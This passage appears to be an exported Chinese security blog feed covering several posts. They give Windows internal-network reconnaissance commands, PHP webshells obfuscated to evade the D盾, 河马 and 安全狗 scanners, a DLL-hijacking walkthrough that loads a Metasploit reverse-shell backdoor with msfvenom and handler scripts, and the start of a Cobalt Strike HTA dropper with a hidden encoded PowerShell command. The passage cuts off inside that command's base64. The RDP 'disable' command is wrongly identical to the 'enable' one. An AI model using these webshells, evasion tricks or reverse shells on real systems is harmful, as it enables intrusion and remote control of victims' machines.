title="启动信息"></a>启动信息</h4></li><li>查看自启动项<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">dir &quot;C:<span class="hljs-symbol">\P</span>rogramData<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>tart Menu<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\S</span>tartUp&quot;<br></code></pre></td></tr></table></figure><h4 id="计划任务-1"><a href="#计划任务-1" class="headerlink" title="计划任务"></a>计划任务</h4></li><li>查看计划任务<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">schtasks /<span class="hljs-keyword">query</span><br></code></pre></td></tr></table></figure><h4 id="后缀信息-1"><a href="#后缀信息-1" class="headerlink" title="后缀信息"></a>后缀信息</h4></li><li>查看文件关联<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">assoc</span> .txt<br><span class="hljs-built_in">ftype</span> | <span class="hljs-built_in">findstr</span> txt<br></code></pre></td></tr></table></figure><h4 id="注册表项"><a href="#注册表项" class="headerlink" title="注册表项"></a>注册表项</h4></li><li>开启3389端口<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure></li><li>关闭3389端口<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure><h4 id="域内信息"><a href="#域内信息" class="headerlink" title="域内信息"></a>域内信息</h4></li></ol><h4 id="密码信息-1"><a href="#密码信息-1" class="headerlink" title="密码信息"></a>密码信息</h4><h4 id="票据信息-1"><a href="#票据信息-1" class="headerlink" title="票据信息"></a>票据信息</h4><h4 id="服务信息-1"><a href="#服务信息-1" class="headerlink" title="服务信息"></a>服务信息</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">tasklist /svc<br><span class="hljs-built_in">sc</span> query<br>wmic service list brief<br><span class="hljs-built_in">Get-WmiObject</span> win32_service | <span class="hljs-built_in">select</span> PathName<br></code></pre></td></tr></table></figure><h4 id="磁盘信息-1"><a href="#磁盘信息-1" class="headerlink" title="磁盘信息"></a>磁盘信息</h4><h4 id="网络信息-1"><a href="#网络信息-1" class="headerlink" title="网络信息"></a>网络信息</h4><ol><li>查看网络信息<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ipconfig<br>arp -a<br>route print<br>netstat -anot<br>Get-NetTCPConnection<br></code></pre></td></tr></table></figure><h4 id="文件信息-1"><a href="#文件信息-1" class="headerlink" title="文件信息"></a>文件信息</h4></li></ol><h4 id="日志信息-1"><a href="#日志信息-1" class="headerlink" title="日志信息"></a>日志信息</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">eventvwr</span><br></code></pre></td></tr></table></figure><h4 id="软件信息-1"><a href="#软件信息-1" class="headerlink" title="软件信息"></a>软件信息</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">wmic product <span class="hljs-keyword">get</span> <span class="hljs-built_in">name</span>,<span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><h4 id="驱动信息-1"><a href="#驱动信息-1" class="headerlink" title="驱动信息"></a>驱动信息</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">DRIVERQUERY <span class="hljs-string">/V</span><br></code></pre></td></tr></table></figure><h4 id="后缀信息-2"><a href="#后缀信息-2" class="headerlink" title="后缀信息"></a>后缀信息</h4><h4 id="注册表信息-1"><a href="#注册表信息-1" class="headerlink" title="注册表信息"></a>注册表信息</h4><h4 id="防火墙信息-1"><a href="#防火墙信息-1" class="headerlink" title="防火墙信息"></a>防火墙信息</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netsh advfirewall firewall</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP免杀</title>
      <link href="2022/09/11/PHP%E5%85%8D%E6%9D%80/"/>
      <url>2022/09/11/PHP%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><p>免杀就是制作开发的病毒木马（脚本或者二进制）不被杀毒软件检测出。<br>而对于web手而言，最熟悉，也是最好入手的就是php免杀</p><a id="more"></a><h2 id="免杀思路"><a href="#免杀思路" class="headerlink" title="免杀思路"></a>免杀思路</h2><p>分析杀软（WAF）,为什么杀你制作的病毒木马,是规则匹配引擎，是机器学习引擎，等等。只有你知道WAF为什么查杀你，你才知道如何绕过，达到免杀效果。</p><h2 id="免杀过程"><a href="#免杀过程" class="headerlink" title="免杀过程"></a>免杀过程</h2><ol><li>定位关键点</li><li>分析关键点</li><li>混淆关键点</li></ol><h2 id="杀软类型"><a href="#杀软类型" class="headerlink" title="杀软类型"></a>杀软类型</h2><ol><li>本地杀软</li><li>云端杀软</li><li>二进制杀软</li><li>脚本杀软</li></ol><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><ol><li>工具免杀</li><li>代码膨胀（增加代码量）</li><li>多层函数嵌套</li></ol><h3 id="本地杀软"><a href="#本地杀软" class="headerlink" title="本地杀软"></a>本地杀软</h3><p>本地杀软主要是绕过火绒，安全狗，D盾，河马等，而本地杀软对比起其他方式，对于攻击者来说是最友好的，因为本地杀软100%可以确定能不能绕过，只有两个结果，清楚明确，不需要猜测。</p><h4 id="测试免杀D盾"><a href="#测试免杀D盾" class="headerlink" title="测试免杀D盾"></a>测试免杀D盾</h4><p>首先写最简单的一句话木马试试</p><p><img src="https://s2.loli.net/2022/09/11/dXptJhWv5Zf7V8B.png" alt="D盾成功拦截"></p><p>再试试我们常用方法中的代码膨胀，主要是向其注入足够的垃圾数据，来绕过本地杀软软件</p><p><img src="https://s2.loli.net/2022/09/11/N6du4mY2nLStMJq.png" alt="代码膨胀免杀失败"></p><p>按照我们的免杀过程，我们先定位关键点，先判断是否过滤了system函数</p><p><img src="https://s2.loli.net/2022/09/11/2zX7mR6Ww1tHQvA.png" alt="system($a);被查杀"><br><img src="https://s2.loli.net/2022/09/11/GeWxXS5IluTyo6m.png" alt="system();函数能够正常使用"></p><p>因此判断，D盾会检查system函数中的参数，来判断其安全性</p><p>依然是过滤参数，我们先试一下用class是否能绕过<br><img src="https://s2.loli.net/2022/09/11/dYfAHs18LGwS9kQ.png" alt="使用class免杀失败"></p><p>还是被查杀了，既然都想到用类了，那就再序列化试一下<br><img src="https://s2.loli.net/2022/09/11/EZmcxgUQ3nAGTpr.png" alt="序列化免杀成功"></p><p>经过序列化之后，我们成功绕过了，但这样是无法成功执行的，我们只需要截取序列化中的关键词出来就行<br><img src="https://s2.loli.net/2022/09/11/4sHpu1UyRfSXk8a.png" alt="免杀成功"><br><img src="https://s2.loli.net/2022/09/11/GODHnIyg2615dqS.png" alt="命令执行成功"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;calc&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getC</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> C;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$l</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;l&quot;</span>];<br>system(substr(serialize(getC()),<span class="hljs-number">26</span>,<span class="hljs-variable">$l</span>));<br>&#125;<br><br>test(<span class="hljs-string">&quot;aa&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="测试免杀河马"><a href="#测试免杀河马" class="headerlink" title="测试免杀河马"></a>测试免杀河马</h4><p>我们先尝试用之前成功免杀D盾的代码来测试一下河马</p><p><img src="https://s2.loli.net/2022/09/11/MIo57bqju1CESeT.png" alt="被河马查杀"><br>能绕过D盾的代码直接被河马查杀了</p><p>还是按照上面的思路，我们先定位关键点<br><img src="https://s2.loli.net/2022/09/11/dE8Bq1hpwFkLYi6.png"><br>发现河马直接过滤掉了system()，无论是否带有参数都直接查杀，挺狗的<br>接着尝试，发现eval()函数可以使用，但用eval()函数去调用system()也会被查杀<br>用编码绕过试一下</p><p>将<code>system(calc);</code>base64编码得到<code>c3lzdGVtKCdjbGFjJyk7</code><br><img src="https://s2.loli.net/2022/09/11/I9WHr7kjJp3c2CY.png" alt="被河马查杀"></p><p>仍然不能绕过，貌似会检测到base64_decode函数，网上找一个手写的脚本，改个函数名试试</p><p><img src="https://s2.loli.net/2022/09/11/iq5KD4AWtwXpIdx.png" alt="还是被查杀"><br>好怪啊，怎么这样还是被查杀，莫非是河马自己后台用php跑一遍测试，或者是跟随了你的代码执行顺序逐句查杀</p><p><img src="https://s2.loli.net/2022/09/11/VLxrkvyQon2WEp3.png"><br>不是吧，这样还是被查杀了，按照代码执行顺序也不对呀</p><p>再反复测试，反复调试了一个下午，最后发现</p><blockquote><p>查杀了注释！！！</p></blockquote><p><img src="https://s2.loli.net/2022/09/11/pKB6mNe7t5Ab24C.png" alt="成功免杀"><br>这次终于对了，删掉了注释，按照代码执行顺序，执行不到eval()函数，成功绕过了河马<br>那我们接下来只需要让它无法判断是否该执行if条件中的语句，就能成功绕过</p><p><img src="https://s2.loli.net/2022/09/11/M9w2AGPfQbXkSLt.png" alt="成功执行命令"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Glacier</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>) </span>&#123;<br><span class="hljs-variable">$keyStr</span> = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;<br><span class="hljs-variable">$chr1</span> = <span class="hljs-variable">$chr2</span> = <span class="hljs-variable">$chr3</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$enc1</span> = <span class="hljs-variable">$enc2</span> = <span class="hljs-variable">$enc3</span> = <span class="hljs-variable">$enc4</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$output</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$input</span> = preg_replace(<span class="hljs-string">&quot;[^A-Za-z0-9\+\/\=]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$input</span>);<br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-variable">$enc1</span> = strpos(<span class="hljs-variable">$keyStr</span>, substr(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$i</span>++, <span class="hljs-number">1</span>));<br><span class="hljs-variable">$enc2</span> = strpos(<span class="hljs-variable">$keyStr</span>, substr(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$i</span>++, <span class="hljs-number">1</span>));<br><span class="hljs-variable">$enc3</span> = strpos(<span class="hljs-variable">$keyStr</span>, substr(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$i</span>++, <span class="hljs-number">1</span>));<br><span class="hljs-variable">$enc4</span> = strpos(<span class="hljs-variable">$keyStr</span>, substr(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$i</span>++, <span class="hljs-number">1</span>));<br><span class="hljs-variable">$chr1</span> = (<span class="hljs-variable">$enc1</span> &lt;&lt; <span class="hljs-number">2</span>) | (<span class="hljs-variable">$enc2</span> &gt;&gt; <span class="hljs-number">4</span>);<br><span class="hljs-variable">$chr2</span> = ((<span class="hljs-variable">$enc2</span> &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">4</span>) | (<span class="hljs-variable">$enc3</span> &gt;&gt; <span class="hljs-number">2</span>);<br><span class="hljs-variable">$chr3</span> = ((<span class="hljs-variable">$enc3</span> &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">6</span>) | <span class="hljs-variable">$enc4</span>;<br><span class="hljs-variable">$output</span> = <span class="hljs-variable">$output</span> . chr((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$chr1</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$enc3</span> != <span class="hljs-number">64</span>) &#123;<br><span class="hljs-variable">$output</span> = <span class="hljs-variable">$output</span> . chr((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$chr2</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$enc4</span> != <span class="hljs-number">64</span>) &#123;<br><span class="hljs-variable">$output</span> = <span class="hljs-variable">$output</span> . chr((<span class="hljs-keyword">int</span>) <span class="hljs-variable">$chr3</span>);<br>&#125;<br><span class="hljs-variable">$chr1</span> = <span class="hljs-variable">$chr2</span> = <span class="hljs-variable">$chr3</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$enc1</span> = <span class="hljs-variable">$enc2</span> = <span class="hljs-variable">$enc3</span> = <span class="hljs-variable">$enc4</span> = <span class="hljs-string">&quot;&quot;</span>;<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$input</span>));<br><span class="hljs-keyword">return</span> urldecode(<span class="hljs-variable">$output</span>);<br>&#125;<br><br><span class="hljs-variable">$b</span> = Glacier(<span class="hljs-string">&quot;c3lzdGVtKCdjYWxjJyk7&quot;</span>); <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>] &gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>])&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里的函数是用的网上别人手写的base64，其实也可以直接用php库中的其他编码形式来绕过河马。</p><h4 id="测试免杀safedog"><a href="#测试免杀safedog" class="headerlink" title="测试免杀safedog"></a>测试免杀safedog</h4><p>使用绕过河马的exp会被safedog拦截，测试发现其是逻辑过滤了eval的参数，那我们换个php的原生函数试一试</p><p>这里的分析过程与上面类似，我们使用了php的原生函数<code>call_user_fnuc(&quot;aa&quot;,$_GET[&quot;a&quot;])</code><br>这里直接贴上exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aa</span> (<span class="hljs-params"><span class="hljs-variable">$cc</span></span>)</span>&#123;<br>    system(<span class="hljs-variable">$cc</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(call_user_func(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/09/11/nCNcuOeiJFK6vzG.png" alt="成功绕过安全狗"><br><img src="https://s2.loli.net/2022/09/11/h8XkPlDoswtg6fB.png" alt="命令执行成功"></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dll劫持与AheadLib</title>
      <link href="2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/"/>
      <url>2022/08/18/dll%E5%8A%AB%E6%8C%81%E4%B8%8EAheadLib/</url>
      
        <content type="html"><![CDATA[<h1 id="dll劫持与AheadLib"><a href="#dll劫持与AheadLib" class="headerlink" title="dll劫持与AheadLib"></a>dll劫持与AheadLib</h1><p>最近在看msf配置信息的时候，看到生成dll文件，突然就想到了dll劫持，于是准备来折腾一下</p><a id="more"></a><h2 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h2><p>dll文件是计算机上的一类文件，提供给使用者一些开箱即用的变量、函数或类。库文件分为静态库和动态库，静态库和动态库的区别体现在程序的链接阶段：静态库在程序的链接阶段被复制到了程序中；动态库在链接阶段没有被复制到程序中，而是程序在运行时由系统动态加载到内存中供程序调用。使用动态库系统只需载入一次，不同的程序可以得到内存中相同的动态库的副本，因此节省了很多内存，而且使用动态库也便于模块化更新程序</p><p>dll劫持是当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间</p><blockquote><p>简单来说，dll的存在就是方便程序来直接调用，避免将相同的内容重复多遍，以此来节省内存<br>而dll劫持，由下面一个例子说明</p></blockquote><p>一个可执行文件运行时，需要调用<code>test.dll</code>文件，但此时我们可以生成一个恶意的<code>test.dll</code>文件，并让他调用我们由msf生成的<code>shell.dll</code>或者其他后门，再调用原来的<code>test.dll</code>文件</p><p><img src="https://s2.loli.net/2022/08/18/kgBDKU17lNzXWQa.png" alt="图解dll劫持"></p><p>如果dll劫持成功了，那原本的可执行文件仍将正常使用，但我们的后门也将成功执行，即msf上线</p><h2 id="AheadLib"><a href="#AheadLib" class="headerlink" title="AheadLib"></a>AheadLib</h2><p>这里推荐一个用来生成dll转发的工具<a href="https://github.com/Yonsm/AheadLib">AheadLib</a></p><p>我们随便找一个dll文件来测试一下</p><p><img src="https://s2.loli.net/2022/08/18/wp5fkSX9FNlmr2L.png"></p><p>我们把它生成的代码复制下来，用VisualStudio创建一个dll动态链接项目，但在这里，可能会出现比较多的问题<br>我这里使用的是ViusalStudio 2019 不同的版本可能会出现的问题不同</p><p>首先项目提示我没有引入头文件，于是我加上了<code>#include &quot;pch.h&quot;</code><br>紧接着出现了如下的报错</p><p><img src="https://s2.loli.net/2022/08/18/BAQiGUXbHg3z8wC.png"></p><p>解决方法是，在<code>项目-&gt;属性-&gt;高级-&gt;字符集</code> 改为使用多字节字符集</p><p><img src="https://s2.loli.net/2022/08/18/1JIjvcpbeUgOWFq.png"></p><p>其他版本的可能存在不同的报错，可以尝试如下方法</p><ol><li>将运行库改为多线程(/MT)<br><img src="https://s2.loli.net/2022/08/18/zank6NWHustC2cR.png"></li><li>将预编译头改为不使用<br><img src="https://s2.loli.net/2022/08/18/1ka4ZxJv6BO32WD.png"></li></ol><p>确认应用之后就只会有一个报错，我们不用管它，在Release x86的模式下，成功生成dll文件<br>成功处理好报错信息后，我们实现了由<code>test(evil).dll -&gt; test(org).dll</code><br>接下来实现<code>test(evil).dll-&gt;shell.dll</code><br>我们在AheadLib工具生成的cpp文件中，找到<code>DLLMain</code>函数，并加上我们需要调用的后门<code>shell.dll</code></p><p><img src="https://s2.loli.net/2022/08/18/Qrme8qxodRO3NGs.png"></p><p>成功编译后，将生成的dll文件改为与原dll相同的名字，即<code>test.dll</code>，将原本的test.dll改为<code>testorg.dll</code><br>这样我们就完成了dll劫持，当运行可执行文件时，将会先调用我们改写的<code>test.dll</code></p><p>最后，msf成功上线</p><p><img src="https://s2.loli.net/2022/08/18/ylZoMNxTp2Pfire.png"></p><hr><h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>最近浅浅的看了下sh文件的写法，于是就想到了写一些msf的sh文件，避免了每次使用msfconsole的复杂配置与msfvenum生成的复杂参数</p><blockquote><p>msfvenum的生成</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh">ip=192.168.31.208<br>port=4444<br>arch=x86<br>platform=windows<br>format=exe<br>payload=windows/meterpreter/reverse_tcp<br><span class="hljs-comment">#use exploit/muilt/handler</span><br>out=../meter_re_tcp_x86.exe<br><br>msfvenom -p <span class="hljs-variable">$payload</span> LHOST=<span class="hljs-variable">$ip</span> LPORT=<span class="hljs-variable">$port</span> -f <span class="hljs-variable">$format</span> -a <span class="hljs-variable">$arch</span> --platform <span class="hljs-variable">$platform</span> -o <span class="hljs-variable">$out</span><br></code></pre></td></tr></table></figure><blockquote><p>msfconsole的监听</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.31.208<br><span class="hljs-built_in">set</span> LPORT 4444<br>run<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dll劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS生成hta分析与powershell免杀</title>
      <link href="2022/08/16/CS%E7%94%9F%E6%88%90hta%E5%88%86%E6%9E%90%E4%B8%8Epowershell%E5%85%8D%E6%9D%80/"/>
      <url>2022/08/16/CS%E7%94%9F%E6%88%90hta%E5%88%86%E6%9E%90%E4%B8%8Epowershell%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="CS生成hta分析与powershell免杀"><a href="#CS生成hta分析与powershell免杀" class="headerlink" title="CS生成hta分析与powershell免杀"></a>CS生成hta分析与powershell免杀</h1><p>看着自己刚开始入门写的wp，才发现自己从来没正儿八经写过啥博客，最近遇到了一群朋友及其博客，于是准备记录一点有质量的内容</p><a id="more"></a><h2 id="hta文件分析"><a href="#hta文件分析" class="headerlink" title="hta文件分析"></a>hta文件分析</h2><p>hta文件是CS钓鱼经常会用到的一种攻击手法，但我从未考虑过里面的内容，今天突发奇想，想来看看里面到底写了些什么东西，并且杀毒软件是对于哪一部分进行了扫描并且报毒</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs VBScript">&lt;script language=<span class="hljs-string">&quot;VBScript&quot;</span>&gt;<br><span class="hljs-keyword">Function</span> var_func()<br><span class="hljs-keyword">Dim</span> var_shell<br><span class="hljs-keyword">Set</span> var_shell = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Wscript.Shell&quot;</span>)<br>var_shell.run <span class="hljs-string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEALwA3AFYAWABhADIALwBpAFMAaABMADkASABIADYARgBQADAAUQBDAGEAdwBpAFgAWQBNAGgAagBWAHAASABHAGcAQQAwAEcANwBBAEQAbQB6AFUAVgBSAHUANwBzAHgASgBuADUAaAB0AHoASABtAHoAdgB6ADMATABSAHYASQB6AGUAdwBrAHUAeQBQAHQATABwAEoARgB1ADcAdQBxAHUAdQByAFUANgBlAHEAeQBUAHQAbQBOAHoAZwBJAEwATQA5AFUAagBsAEwAdQBaADAAQwBDADAAUABKAGUAcgA1AEgATABYAFQAVQA5AGgAMwBCAFAAMwBMAFoAOQBiAFIAeQA1AG0ANgBYAFEANgBlAEQARQBwAGUALwBFAEQARAA3ADgAZwBRAGcASQBhAGgAdAB4AGYAdQBhAHMAKwBDAHAARABEAEYAYQA3ADMASwBIAGgAeABQAEIATABaAHQATQBoAGwATAA2AGsAZwBKAFYARgBBACsAYQB1AHIAMwBGAFUAMgBGAGIAawBoAFcAdABNAFgARgB6AEYAcgBUADEAOABjAHkAagBZAGUAQwBXAEcAagB3AGwATAAwAC8AYQBiAG4ASQBNAHQAZABmAGYAMwBhAGkASQBLAEEAdQB1AHoAMABYAG0AcABSAEoAbwBZAGgAZABRAHoAYgBvAG0ARwBCADUANwA1AHoAMAB3ADAATgA2AE0AMgB6AHMAYQBXAFkAYwBYADkAeAAxAHkAKwBsAGwAdQAwAFoAeQBEADYATABKAFEAMgBFAE4AeABDAFEANgBKAEoAMAByAGUAZABoAGwARQBaAFEAMABuADMAYgBZAG8AWAA4AG4AMwAvAG0AKwBlAFgATgA3AGEAbwBrADcAUwBKAGsAaAA0AFcAOABuAG8AUwBNAE8AaQBWAGkAMgAzAG0AZQArADgARwBuAEcANAA0AFMAbgB4AGIAeQBxAG8AVQBEAEwALwBUAFcAcgBEAFMAMQBYAEsARgBTAEcAbQBmAGUAYQA1AG4AegA2AHMAbgAzAFAASAArAE8AegBQAFEAUgB4AFAARgA1AGsASwBuAFYAawAwADQAaABEADgATQArAFkAQwBPAGUATQBNAHcAWAB1AFcAVwA2ADMAMwBLADEANAByADYAOQBlAFQATwBNAFgARwBZADUAdABLAFMANABqAEEAYQBlAHIAOQBOAGcAYgAyAEUAYQBsAHQAcgBJAEoAVABZAGQAMABqAFcAbwA1AFUATgBJAG4AMgB2AG0AZQBYAEEAaQBvAEMAdwBLAFgATwA3AGkAQwArAGoAdAB2AFYAZABhAHUASABZAGoAMgB5ADYAQwAzAGUAWAB2ADIAbAAwAFYATgBCAHAAZgB3AFAAMQBkAHAAYwBKADcASgBaAEQAcQBzADQAQQB2AG4AagBuAHgATwAzAEMAbwBHAFcAOQBPADUAaQBDAGMAWAA3AHgALwBSAHkANABlAGYAcgA4AFEAagBNAC8AOQB5AEgAMQBBAFYAVQBKAHQAYQBpAEoARwBYAHgAagBnACsANAA2AHIAdQBhAHUAcgBaAFQAYQBrAEUARQArAGgANwA0AFYAVwBwAHYAZgBFAGwAWQB1AGMAQwBrADQAZwA1AGcAVgBKAG0AcwA1AFIARQBGAEYAKwA5AFgAZAArAFQAdAB0AGUATgBNAFAAaQBwADQAWgB1AEwAMQBwAG4AbgBWAE4ANgBUAG4ANAA4AGMAYwB1AEoAWgA1AEYAVgA3AG8AcgBQAG4AZABtAFQAegByADgAWQBrAFcAVQBUAEcAcQBUAHIAbgA1ACsARwBKAGwAMQBiAEwAbQAwAG0ATABuAEkAcwBmAEMARgA4ADQAYQBPAGMAMABiAFYATgBNAHoAeABLAEYAegBFAE4ALwBDAHoAawB6